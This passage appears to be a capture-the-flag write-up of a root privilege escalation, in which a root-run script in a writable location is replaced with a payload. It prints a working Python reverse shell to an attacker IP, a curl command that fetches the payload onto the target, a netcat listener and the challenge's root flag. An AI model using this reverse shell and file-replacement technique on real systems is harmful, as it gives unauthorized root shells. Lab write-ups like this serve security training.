Using *pspy64*, we can see that *script.py* is run by root:

```txt
2022/05/03 19:00:01 CMD: UID=0    PID=26465  | cp /root/script.py /home/sun/Documents/script.py
```

We can edit */home/sun/Documents/script.py*

Create a python reverse shell file named *rev.py* on your attacker machine:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.3",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
```

Spin up an http server on your attacker machine:

```bash
python3 -m http.server 8000
```

Copy the reverse shell into */home/sun/Documents/script.py* by running the following command on the target machine:

```bash
curl -o /home/sun/Documents/script.py http://10.10.14.3:8000/rev.py
```

Start a netcat listener on your attacker machine:

```bash
nc -lvnp 1234
```

We can see that the python file has been run:

![[process_is_run.png]]

We get a shell:

![[pop_root_shell.png]]

root.txt
```txt
ba1d0019200a54e370ca151007a8095a
```